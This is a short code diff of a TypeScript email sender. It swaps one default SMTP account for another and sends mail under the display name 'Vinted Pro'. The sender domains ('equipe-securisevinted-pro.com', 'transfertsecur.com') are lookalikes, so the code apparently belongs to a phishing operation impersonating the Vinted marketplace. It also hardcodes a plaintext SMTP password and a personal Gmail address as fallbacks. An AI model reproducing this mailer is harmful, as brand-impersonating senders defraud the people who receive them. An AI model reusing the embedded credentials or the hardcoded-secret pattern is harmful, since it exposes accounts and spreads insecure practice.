@@ -20,7 +20,7 @@ const getTransporter = (provider: SMTPProvider) => {
       port: Number(process.env.HOSTINGER_SMTP_PORT) || 465,
       secure: process.env.HOSTINGER_SMTP_SECURE === "true",
       auth: {
-        user: process.env.HOSTINGER_SMTP_USER || "info@equipe-securisevinted-pro.com",
+        user: process.env.HOSTINGER_SMTP_USER || "support@transfertsecur.com",
         pass: process.env.HOSTINGER_SMTP_PASS || "Amour##v22@",
       },
     });
@@ -50,7 +50,7 @@ export async function sendEmail(opts: SendEmailOptions) {
   if (provider === "gmail") {
     smtpUser = process.env.GMAIL_SMTP_USER || "mickael.andjui.21@gmail.com";
   } else {
-    smtpUser = process.env.HOSTINGER_SMTP_USER || "info@equipe-securisevinted-pro.com";
+    smtpUser = process.env.HOSTINGER_SMTP_USER || "support@transfertsecur.com";
   }
 
   const from = `"${opts.senderName || "Vinted Pro"}" <${smtpUser}>`;
